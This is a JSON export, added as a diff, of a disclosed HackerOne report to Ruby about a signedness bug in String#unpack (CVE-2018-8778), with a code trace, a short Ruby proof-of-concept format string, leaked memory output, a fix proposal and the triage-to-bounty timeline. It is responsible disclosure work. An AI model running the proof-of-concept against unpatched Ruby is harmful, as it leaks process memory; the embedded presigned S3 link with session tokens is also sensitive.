@@ -1,0 +1,517 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-03-30T08:40:12.955Z", 
+    "voters": [
+        "akaash_pantherdefence", 
+        "muon4", 
+        "eveeez", 
+        "apapedulimu", 
+        "cuso4", 
+        "0x08", 
+        "niced4y", 
+        "abdullahzk", 
+        "arielmarlon", 
+        "caturipah", 
+        "and 1 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "500.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 298246, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-03-30T02:01:21.786Z", 
+    "vulnerability_information": "Brief\n-----\nThere is a signedness error in the pack_unpack_internal(), allowing the '@' type to trigger a buffer under-read when unpacking with a controlled format (similar to format string implementation vulnerabilities).\n\nCode Vulnerability\n--------------------\n**Vulnerable version:** 2.5.0 (rc) and prior (tested also on 2.3.3)\n**Scope:** works on 32 bit and 64 bit versions\n**File:** pack.c\n**Function:** pack_unpack_internal()\n**Code Trace:**\n1. *len* is a **signed** long: \n\n    ```ruby\n        long len;\n    ```\n1. *len* can be parsed using a decimal string representation, to hold **any** unsigned long value\n\n    ```ruby\n    ...\n\telse if (ISDIGIT(*p)) {\n\t    errno = 0;\n\t\tlen = STRTOUL(p, (char**)&p, 10);\n\t    if (errno) {\n\t\trb_raise(rb_eRangeError, \"pack length too big\");\n\t    }\n\t}\n    ...\n    ```\n1. Using a **negative** *len* value, the '@' type will move the string backwards:\n\n    ```ruby\n    ...\n\tcase '@':\n        // EI - Trace: negative length will pass this check\n\t    if (len > RSTRING_LEN(str))\n\t\t  rb_raise(rb_eArgError, \"@ outside of string\");\n         // EI - Trace: negative length will move s backwards\n\t    s = RSTRING_PTR(str) + len;\n\t    break;\n    ...\n    ```\n1. Later unpacking will parse memory data before the buffer's start\n\nPoC Script\n------------\nThe script was tested on 32 bit. On 64 bit one should only adjust the numerical values accordingly (64 bit was tested on 2.3.3 and worked).\n\n```ruby\nputs 'Version: ' + RUBY_VERSION\nputs 2 ** 32 - 100\n\nputs '**********************************'\nputs 'Expected:'\n\"0123456789\".unpack(\"C10\").each { |x| puts x.to_s(16) }\n\nputs '**********************************'\nputs 'Leaked + Expected:'\n\"0123456789\".unpack(\"@4294967196C110\").each { |x| puts x.to_s(16) }\nputs '**********************************'\n```\n\n**Output:**\n\n```\nVersion: 2.5.0\n4294967196\n**********************************\nExpected:\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n**********************************\nLeaked + Expected:\n28\n13\ne2\n1\nc1\n24\n0\n0\n40\n43\ndf\n1\n65\n48\n92\n20\n3c\n7e\ndf\n1\n72\n65\n6d\n61\n69\n6e\n64\n65\n72\n0\n0\n0\n7a\n60\n1\n0\n30\n1\nf5\n1\n50\nc5\nef\n1\n7f\na3\n0\n0\n30\n1\nf5\n1\n7a\n60\n5\n0\n40\n43\ndf\n1\n8\n13\ne2\n1\nb1\n24\n0\n0\n40\n43\ndf\n1\n65\n88\n91\n20\n3c\n7e\ndf\n1\n6d\n6f\n64\n75\n6c\n6f\n0\n0\n0\n0\n0\n0\n5\n80\n52\n0\n3c\n7e\ndf\n1\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n**********************************\n```\n\nProposed Fix:\n---------------\n*len* should be limited to hold only positive values, and it should be enforced right after *len* is parsed. A different fix could be to specifically check if *len* is negative in all dangerous places in the unpack() function.\n\n## Impact\n\nImpact\n--------\nAn attacker controlling the unpacking format (similar to format string vulnerabilities) can trigger a **massive and controlled** information disclosure. Since Ruby is a managed language, programmers assume that the library would catch such dangerous code samples and protect them from these types of attacks.\n\nThis vulnerability is similar to the implementation vulnerability that was found earlier this year (2017) in the format string (sprintf) module, and in both cases programmers that use an attacker controlled format can be harmed due to an implementation bug in the ruby module.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "metrics": {
+            "confidentiality": "high", 
+            "privileges_required": "none", 
+            "user_interaction": "none", 
+            "attack_vector": "local", 
+            "attack_complexity": "low", 
+            "scope": "unchanged", 
+            "integrity": "none", 
+            "availability": "none"
+        }, 
+        "rating": "medium", 
+        "score": 6.2, 
+        "author_type": "User"
+    }, 
+    "title": "controlled buffer under-read in pack_unpack_internal()", 
+    "is_member_of_team?": null, 
+    "vote_count": 11, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2018-04-29T02:01:21.905Z", 
+    "state": "Closed", 
+    "cve_ids": [
+        "CVE-2018-8778"
+    ], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$500", 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2017-12-15T14:24:02.065Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-12-15T14:24:02.065Z", 
+            "actor": {
+                "username": "hsbt", 
+                "url": "/hsbt", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/051/808/a7d4f1d7b3f5de51caf190236c85c70986dc15ff_medium.jpg?1486003618"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ruby", 
+            "message": "ack, We are evaluating it.", 
+            "markdown_message": "<p>ack, We are evaluating it.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2225561, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-12-18T09:57:29.898Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-12-18T09:57:29.898Z", 
+            "actor": {
+                "username": "hsbt", 
+                "url": "/hsbt", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/051/808/a7d4f1d7b3f5de51caf190236c85c70986dc15ff_medium.jpg?1486003618"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ruby", 
+            "message": "@adambacchus We considered that your report was a vulnerability of `String#unpack`. We will handle this early next year. Are you ok to this disclose schedule?", 
+            "markdown_message": "<p><a href=\"/adambacchus\">@adambacchus</a> We considered that your report was a vulnerability of <code>String#unpack</code>. We will handle this early next year. Are you ok to this disclose schedule?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2231004, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-12-18T19:18:09.208Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-12-18T19:18:09.208Z", 
+            "actor": {
+                "username": "aerodudrizzt", 
+                "url": "/aerodudrizzt", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/646/dd4a57adcca0f309d5866361ff6cf9a683425281_medium.png?1483983167"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ruby", 
+            "message": "Thanks for the fast response. I am fine with the disclosure schedule.", 
+            "markdown_message": "<p>Thanks for the fast response. I am fine with the disclosure schedule.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2232493, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-14T06:16:21.175Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-14T06:16:21.175Z", 
+            "actor": {
+                "username": "aerodudrizzt", 
+                "url": "/aerodudrizzt", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/646/dd4a57adcca0f309d5866361ff6cf9a683425281_medium.png?1483983167"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ruby", 
+            "message": "Any update regarding this ticket? I failed to find a commit that patches this vulnerability in the git repos.", 
+            "markdown_message": "<p>Any update regarding this ticket? I failed to find a commit that patches this vulnerability in the git repos.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2381110, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-17T00:42:18.848Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-17T00:42:18.848Z", 
+            "actor": {
+                "username": "hsbt", 
+                "url": "/hsbt", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/051/808/a7d4f1d7b3f5de51caf190236c85c70986dc15ff_medium.jpg?1486003618"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ruby", 
+            "message": "Sorry, there is no update. Because the maintainer related your report lost him authentication of hackerone. We could not handle this.", 
+            "markdown_message": "<p>Sorry, there is no update. Because the maintainer related your report lost him authentication of hackerone. We could not handle this.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2392983, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-17T09:49:49.288Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-17T09:49:49.288Z", 
+            "actor": {
+                "username": "aerodudrizzt", 
+                "url": "/aerodudrizzt", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/646/dd4a57adcca0f309d5866361ff6cf9a683425281_medium.png?1483983167"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ruby", 
+            "message": "OK. Do you know when approximately this ticket will be handled?", 
+            "markdown_message": "<p>OK. Do you know when approximately this ticket will be handled?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2394351, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-01T07:44:21.947Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-01T07:44:21.947Z", 
+            "actor": {
+                "username": "hsbt", 
+                "url": "/hsbt", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/051/808/a7d4f1d7b3f5de51caf190236c85c70986dc15ff_medium.jpg?1486003618"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ruby", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugTriaged", 
+            "id": 2445237, 
+            "genius_execution_id": null
+        }, 
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/270/478/507ec95edc9abbbeaced42921fc15e3a943db739/fix-underflow.patch?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6DOF4BH7%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222558Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDAsIeiAo1xTw4kIWniK3AwV1z%2FDNuc2GpLi7AJOEJ0e4NWAql7yl6ReQj30YP2K5FBrc9xv0H8z3PZE4N7C099Z%2FTC7v7C1gzo54Jgi%2FX3cl%2B1K8PJ1QoShLHpAAjRjf5ciIakpyJZtfax9fUrlrfbg93561WLH%2BcAlYZYP%2FDoT4YEiEnKFoc6r1kz0vtgQeOMs4HdHNkjkFGMI77%2BHQkyTCbcJv5zS%2BkPk%2FmeIs5TPwLonNR3KC9vVtG8%2FxH87F2PEClO9BEdrskZjtMWY6P010JBQmt1CorTu4hj%2BXFqvR%2F690HP1hcC8CWJCyppmtZv0XEClGLMVyC6ib3jbvYHrbrPEHfmQP2RQi0FwMeueNkOH5qbyGqwmmxB4agSDiXM3XAl%2BTc87Wf5p1e%2Bc0zjzZ0xQeKM%2F%2B6b6TparaVSEWnYgYleztcjU3fPWHAZNwL16PwqewCVGh0Qp%2BPnUemfdihk3MmFQeIjHmE7sOQgXva7HlIEEEJ1hyrapkEutFP16gxCQzYqmfLGEsK0wbCxHgen0YqfDv81EZR726krPSisHScLMujI0SnwbcN8IyUwIYqnw663l%2FY9Dhpcje1uM19tGvbMUolrmm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c1fca3d92b008ccfc5db1fd7db4b51a248bb753fe2a914bf1f084452a0c313f3", 
+                    "type": "text/x-diff", 
+                    "id": 270478, 
+                    "filename": "fix-underflow.patch"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2018-03-08T02:14:01.345Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-08T02:14:01.345Z", 
+            "actor": {
+                "username": "hsbt", 
+                "url": "/hsbt", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/051/808/a7d4f1d7b3f5de51caf190236c85c70986dc15ff_medium.jpg?1486003618"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ruby", 
+            "message": "@aerodudrizzt Can you review attached patch? ", 
+            "markdown_message": "<p><a href=\"/aerodudrizzt\">@aerodudrizzt</a> Can you review attached patch? </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2471812, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-08T02:59:27.622Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-08T02:59:27.622Z", 
+            "actor": {
+                "username": "aerodudrizzt", 
+                "url": "/aerodudrizzt", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/646/dd4a57adcca0f309d5866361ff6cf9a683425281_medium.png?1483983167"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ruby", 
+            "message": "The patch will fix the vulnerability.", 
+            "markdown_message": "<p>The patch will fix the vulnerability.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2471891, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-20T00:18:35.320Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-20T00:18:35.320Z", 
+            "actor": {
+                "username": "hsbt", 
+                "url": "/hsbt", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/051/808/a7d4f1d7b3f5de51caf190236c85c70986dc15ff_medium.jpg?1486003618"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ruby", 
+            "cve_ids": [
+                "CVE-2018-8778"
+            ], 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::CveIdAdded", 
+            "id": 2508053, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "aerodudrizzt", 
+                "url": "/aerodudrizzt"
+            }, 
+            "created_at": "2018-03-29T01:45:47.900Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-29T01:45:47.900Z", 
+            "actor": {
+                "username": "hsbt", 
+                "url": "/hsbt", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/051/808/a7d4f1d7b3f5de51caf190236c85c70986dc15ff_medium.jpg?1486003618"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ruby", 
+            "message": "We fixed this report with Ruby 2.2.10, 2.3.7, 2.4.4, 2.5.1", 
+            "markdown_message": "<p>We fixed this report with Ruby 2.2.10, 2.3.7, 2.4.4, 2.5.1</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 2542435, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2018-03-30T02:00:44.193Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-30T02:00:44.193Z", 
+            "actor": {
+                "url": "/ruby", 
+                "profile": {
+                    "name": "Ruby"
+                }, 
+                "ibb": true, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/007/724/0c1556227f51c9b2b13ada11ccd2fb02cc9fa257_medium.png?1449271894"
+                }
+            }, 
+            "team_handle": "ruby", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "500.0", 
+            "collaborator": {
+                "username": "aerodudrizzt", 
+                "url": "/aerodudrizzt"
+            }, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BountyAwarded", 
+            "id": 2545860, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-30T02:01:21.829Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-30T02:01:21.829Z", 
+            "actor": {
+                "username": "hsbt", 
+                "url": "/hsbt", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/051/808/a7d4f1d7b3f5de51caf190236c85c70986dc15ff_medium.jpg?1486003618"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ruby", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2545864, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-30T08:40:02.044Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-30T08:40:02.044Z", 
+            "actor": {
+                "username": "aerodudrizzt", 
+                "url": "/aerodudrizzt", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/646/dd4a57adcca0f309d5866361ff6cf9a683425281_medium.png?1483983167"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ruby", 
+            "message": "Thanks for the reward.", 
+            "markdown_message": "<p>Thanks for the reward.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2546727, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-30T08:40:12.989Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-30T08:40:12.989Z", 
+            "actor": {
+                "username": "aerodudrizzt", 
+                "url": "/aerodudrizzt", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/646/dd4a57adcca0f309d5866361ff6cf9a683425281_medium.png?1483983167"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ruby", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2546728, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-30T08:40:13.065Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-30T08:40:13.065Z", 
+            "actor": {
+                "username": "aerodudrizzt", 
+                "url": "/aerodudrizzt", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/646/dd4a57adcca0f309d5866361ff6cf9a683425281_medium.png?1483983167"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ruby", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 2546729, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "aerodudrizzt", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/aerodudrizzt", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/098/646/6dd706f25a4db060df25b01c8609c8f1762533f0_small.png?1483983167"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 10, 
+        "name": "Buffer Under-read"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -19167876.165867336, 
+    "disclosed_at": "2018-03-30T08:40:13.042Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/298246", 
+    "created_at": "2017-12-15T12:21:22.135Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<h2 id=\"brief\">Brief</h2>\n\n<p>There is a signedness error in the pack_unpack_internal(), allowing the &#39;@&#39; type to trigger a buffer under-read when unpacking with a controlled format (similar to format string implementation vulnerabilities).</p>\n\n<h2 id=\"code-vulnerability\">Code Vulnerability</h2>\n\n<p><strong>Vulnerable version:</strong> 2.5.0 (rc) and prior (tested also on 2.3.3)<br>\n<strong>Scope:</strong> works on 32 bit and 64 bit versions<br>\n<strong>File:</strong> pack.c<br>\n<strong>Function:</strong> pack_unpack_internal()<br>\n<strong>Code Trace:</strong></p>\n\n<ol>\n<li>\n<p><em>len</em> is a <strong>signed</strong> long: </p>\n<pre class=\"highlight ruby\"><code>    <span class=\"n\">long</span> <span class=\"n\">len</span><span class=\"p\">;</span>\n</code></pre>\n</li>\n<li>\n<p><em>len</em> can be parsed using a decimal string representation, to hold <strong>any</strong> unsigned long value</p>\n<pre class=\"highlight ruby\"><code><span class=\"p\">.</span><span class=\"nf\">.</span><span class=\"p\">.</span>\n<span class=\"nf\">else</span> <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"no\">ISDIGIT</span><span class=\"p\">(</span><span class=\"o\">*</span><span class=\"nb\">p</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n    <span class=\"n\">errno</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n    <span class=\"n\">len</span> <span class=\"o\">=</span> <span class=\"no\">STRTOUL</span><span class=\"p\">(</span><span class=\"nb\">p</span><span class=\"p\">,</span> <span class=\"p\">(</span><span class=\"n\">char</span><span class=\"o\">**</span><span class=\"p\">)</span><span class=\"o\">&amp;</span><span class=\"nb\">p</span><span class=\"p\">,</span> <span class=\"mi\">10</span><span class=\"p\">);</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">errno</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"n\">rb_raise</span><span class=\"p\">(</span><span class=\"n\">rb_eRangeError</span><span class=\"p\">,</span> <span class=\"s2\">&quot;pack length too big&quot;</span><span class=\"p\">);</span>\n    <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n<span class=\"p\">.</span><span class=\"nf\">.</span><span class=\"o\">.</span>\n</code></pre>\n</li>\n<li>\n<p>Using a <strong>negative</strong> <em>len</em> value, the &#39;@&#39; type will move the string backwards:</p>\n<pre class=\"highlight ruby\"><code><span class=\"p\">.</span><span class=\"nf\">.</span><span class=\"p\">.</span>\n<span class=\"nf\">case</span> <span class=\"s1\">&#39;@&#39;</span><span class=\"p\">:</span>\n    <span class=\"sr\">//</span> <span class=\"no\">EI</span> <span class=\"o\">-</span> <span class=\"no\">Trace</span><span class=\"p\">:</span> <span class=\"n\">negative</span> <span class=\"n\">length</span> <span class=\"n\">will</span> <span class=\"n\">pass</span> <span class=\"n\">this</span> <span class=\"n\">check</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">len</span> <span class=\"o\">&gt;</span> <span class=\"no\">RSTRING_LEN</span><span class=\"p\">(</span><span class=\"n\">str</span><span class=\"p\">))</span>\n      <span class=\"n\">rb_raise</span><span class=\"p\">(</span><span class=\"n\">rb_eArgError</span><span class=\"p\">,</span> <span class=\"s2\">&quot;@ outside of string&quot;</span><span class=\"p\">);</span>\n     <span class=\"sr\">//</span> <span class=\"no\">EI</span> <span class=\"o\">-</span> <span class=\"no\">Trace</span><span class=\"p\">:</span> <span class=\"n\">negative</span> <span class=\"n\">length</span> <span class=\"n\">will</span> <span class=\"n\">move</span> <span class=\"n\">s</span> <span class=\"n\">backwards</span>\n    <span class=\"n\">s</span> <span class=\"o\">=</span> <span class=\"no\">RSTRING_PTR</span><span class=\"p\">(</span><span class=\"n\">str</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"n\">len</span><span class=\"p\">;</span>\n    <span class=\"k\">break</span><span class=\"p\">;</span>\n<span class=\"p\">.</span><span class=\"nf\">.</span><span class=\"o\">.</span>\n</code></pre>\n</li>\n<li><p>Later unpacking will parse memory data before the buffer&#39;s start</p></li>\n</ol>\n\n<h2 id=\"poc-script\">PoC Script</h2>\n\n<p>The script was tested on 32 bit. On 64 bit one should only adjust the numerical values accordingly (64 bit was tested on 2.3.3 and worked).</p>\n<pre class=\"highlight ruby\"><code><span class=\"nb\">puts</span> <span class=\"s1\">&#39;Version: &#39;</span> <span class=\"o\">+</span> <span class=\"no\">RUBY_VERSION</span>\n<span class=\"nb\">puts</span> <span class=\"mi\">2</span> <span class=\"o\">**</span> <span class=\"mi\">32</span> <span class=\"o\">-</span> <span class=\"mi\">100</span>\n\n<span class=\"nb\">puts</span> <span class=\"s1\">&#39;**********************************&#39;</span>\n<span class=\"nb\">puts</span> <span class=\"s1\">&#39;Expected:&#39;</span>\n<span class=\"s2\">&quot;0123456789&quot;</span><span class=\"p\">.</span><span class=\"nf\">unpack</span><span class=\"p\">(</span><span class=\"s2\">&quot;C10&quot;</span><span class=\"p\">).</span><span class=\"nf\">each</span> <span class=\"p\">{</span> <span class=\"o\">|</span><span class=\"n\">x</span><span class=\"o\">|</span> <span class=\"nb\">puts</span> <span class=\"n\">x</span><span class=\"p\">.</span><span class=\"nf\">to_s</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)</span> <span class=\"p\">}</span>\n\n<span class=\"nb\">puts</span> <span class=\"s1\">&#39;**********************************&#39;</span>\n<span class=\"nb\">puts</span> <span class=\"s1\">&#39;Leaked + Expected:&#39;</span>\n<span class=\"s2\">&quot;0123456789&quot;</span><span class=\"p\">.</span><span class=\"nf\">unpack</span><span class=\"p\">(</span><span class=\"s2\">&quot;@4294967196C110&quot;</span><span class=\"p\">).</span><span class=\"nf\">each</span> <span class=\"p\">{</span> <span class=\"o\">|</span><span class=\"n\">x</span><span class=\"o\">|</span> <span class=\"nb\">puts</span> <span class=\"n\">x</span><span class=\"p\">.</span><span class=\"nf\">to_s</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)</span> <span class=\"p\">}</span>\n<span class=\"nb\">puts</span> <span class=\"s1\">&#39;**********************************&#39;</span>\n</code></pre>\n<p><strong>Output:</strong></p>\n<pre class=\"highlight plaintext\"><code>Version: 2.5.0\n4294967196\n**********************************\nExpected:\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n**********************************\nLeaked + Expected:\n28\n13\ne2\n1\nc1\n24\n0\n0\n40\n43\ndf\n1\n65\n48\n92\n20\n3c\n7e\ndf\n1\n72\n65\n6d\n61\n69\n6e\n64\n65\n72\n0\n0\n0\n7a\n60\n1\n0\n30\n1\nf5\n1\n50\nc5\nef\n1\n7f\na3\n0\n0\n30\n1\nf5\n1\n7a\n60\n5\n0\n40\n43\ndf\n1\n8\n13\ne2\n1\nb1\n24\n0\n0\n40\n43\ndf\n1\n65\n88\n91\n20\n3c\n7e\ndf\n1\n6d\n6f\n64\n75\n6c\n6f\n0\n0\n0\n0\n0\n0\n5\n80\n52\n0\n3c\n7e\ndf\n1\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n**********************************\n</code></pre>\n<h2 id=\"proposed-fix\">Proposed Fix:</h2>\n\n<p><em>len</em> should be limited to hold only positive values, and it should be enforced right after <em>len</em> is parsed. A different fix could be to specifically check if <em>len</em> is negative in all dangerous places in the unpack() function.</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>An attacker controlling the unpacking format (similar to format string vulnerabilities) can trigger a <strong>massive and controlled</strong> information disclosure. Since Ruby is a managed language, programmers assume that the library would catch such dangerous code samples and protect them from these types of attacks.</p>\n\n<p>This vulnerability is similar to the implementation vulnerability that was found earlier this year (2017) in the format string (sprintf) module, and in both cases programmers that use an attacker controlled format can be harmed due to an implementation bug in the ruby module.</p>\n", 
+    "severity_rating": "medium", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://www.ruby-lang.org", 
+            "about": "A Programmer's Best Friend", 
+            "twitter_handle": "", 
+            "name": "Ruby"
+        }, 
+        "handle": "ruby", 
+        "url": "https://hackerone.com/ruby", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/007/724/36e273f967b252ae8b4051d09ffc08f7de16d7d5_small.png?1449271894", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/007/724/0c1556227f51c9b2b13ada11ccd2fb02cc9fa257_medium.png?1449271894"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 7724, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
